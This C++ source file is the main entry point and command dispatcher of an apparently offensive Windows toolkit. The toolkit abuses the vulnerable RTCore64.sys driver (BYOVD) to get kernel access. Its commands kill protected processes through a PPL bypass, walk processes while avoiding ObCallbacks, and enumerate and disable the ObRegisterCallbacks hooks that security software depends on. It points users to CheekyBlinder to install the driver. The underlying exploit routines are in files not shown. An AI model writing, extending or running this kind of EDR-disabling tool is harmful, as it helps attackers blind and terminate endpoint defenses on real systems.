#include <Windows.h>
#include <cstdio>
#include <cstring>
#include "driver/IDriverBackend.h"
#include "driver/RTCore64Backend.h"
#include "commands.h"

// Global backend instance
IDriverBackend* g_drv = nullptr;

static void Banner() {
    printf(
        "\n"
        " ██████╗ ██████╗ ███╗   ███╗ █████╗ ███████╗████████╗███████╗██████╗\n"
        "██╔═══██╗██╔══██╗████╗ ████║██╔══██╗██╔════╝╚══██╔══╝██╔════╝██╔══██╗\n"
        "██║   ██║██████╔╝██╔████╔██║███████║███████╗   ██║   █████╗  ██████╔╝\n"
        "██║   ██║██╔══██╗██║╚██╔╝██║██╔══██║╚════██║   ██║   ██╔══╝  ██╔══██╗\n"
        "╚██████╔╝██████╔╝██║ ╚═╝ ██║██║  ██║███████║   ██║   ███████╗██║  ██║\n"
        " ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝\n"
        "  Kernel System Toolkit v1.0  |  BYOVD via RTCore64.sys\n\n"
    );
}

static void Usage(const char* prog) {
    printf(
        "Usage: %s <command> [args]\n\n"
        "  Process:\n"
        "    /proc                 List all processes (kernel walk, no ObCallback)\n"
        "    /kill <pid>           Terminate process (PPL bypass via EPROCESS.Protection)\n\n"
        "  System:\n"
        "    /drivers              List loaded kernel modules\n"
        "    /services [all]       List services (default: running only)\n"
        "    /net                  TCP/UDP connections with process names\n\n"
        "  ObCallbacks:\n"
        "    /obcb [process|thread] Enumerate ObRegisterCallbacks\n"
        "    /disable <PreOp_addr>  Disable callback (zero PreOp, Enabled=0)\n"
        "    /enable  <PreOp_addr>  Set Enabled=1 on matching entry\n\n"
        "  Driver backend:\n"
        "    /backend [rtcore64]   Select driver backend (default: rtcore64)\n\n"
        "Note: Requires RTCore64.sys running. Install via CheekyBlinder /installDriver\n",
        prog
    );
}

int main(int argc, char* argv[]) {
    SetConsoleOutputCP(CP_UTF8);
    Banner();

    if (argc < 2) { Usage(argv[0]); return 1; }

    // Select backend (default: RTCore64)
    // Future: parse /backend flag to switch to GigabyteBackend etc.
    RTCore64Backend rtcore;
    g_drv = &rtcore;

    const char* cmd = argv[1];
    if (cmd[0] == '/' || cmd[0] == '-') cmd++;

    // ── Commands that don't need driver ──────────────────────────────────────
    if (_stricmp(cmd, "help") == 0 || _stricmp(cmd, "?") == 0 || _stricmp(cmd, "h") == 0) {
        Usage(argv[0]); return 0;
    }

    // ── Open driver ───────────────────────────────────────────────────────────
    if (!g_drv->Open()) {
        printf("[!] Cannot open %s (error %lu)\n", g_drv->Name(), GetLastError());
        printf("[!] Run CheekyBlinder /installDriver first, or: sc start RTCore64\n\n");
        return 1;
    }
    printf("[+] Backend: %s\n\n", g_drv->Name());

    // ── Dispatch ──────────────────────────────────────────────────────────────
    if (_stricmp(cmd, "proc") == 0) {
        CmdProc();
    }
    else if (_stricmp(cmd, "kill") == 0) {
        if (argc < 3) { printf("[!] /kill requires a PID\n"); return 1; }
        DWORD pid = (DWORD)strtoul(argv[2], nullptr, 10);
        CmdKill(pid);
    }
    else if (_stricmp(cmd, "drivers") == 0) {
        CmdDrivers();
    }
    else if (_stricmp(cmd, "services") == 0) {
        bool all = (argc >= 3 && _stricmp(argv[2], "all") == 0);
        CmdServices(all);
    }
    else if (_stricmp(cmd, "net") == 0) {
        CmdNet();
    }
    else if (_stricmp(cmd, "obcb") == 0) {
        bool proc = true, thr = true;
        if (argc >= 3 && _stricmp(argv[2], "process") == 0) thr  = false;
        if (argc >= 3 && _stricmp(argv[2], "thread")  == 0) proc = false;
        CmdObcb(proc, thr);
    }
    else if (_stricmp(cmd, "disable") == 0) {
        if (argc < 3) { printf("[!] /disable requires an address\n"); return 1; }
        unsigned long long addr = strtoull(argv[2], nullptr, 16);
        CmdDisable(addr);
    }
    else if (_stricmp(cmd, "enable") == 0) {
        if (argc < 3) { printf("[!] /enable requires an address\n"); return 1; }
        unsigned long long addr = strtoull(argv[2], nullptr, 16);
        CmdEnable(addr);
    }
    else {
        printf("[!] Unknown command: /%s\n\n", cmd);
        Usage(argv[0]);
        g_drv->Close();
        return 1;
    }

    g_drv->Close();
    return 0;
}
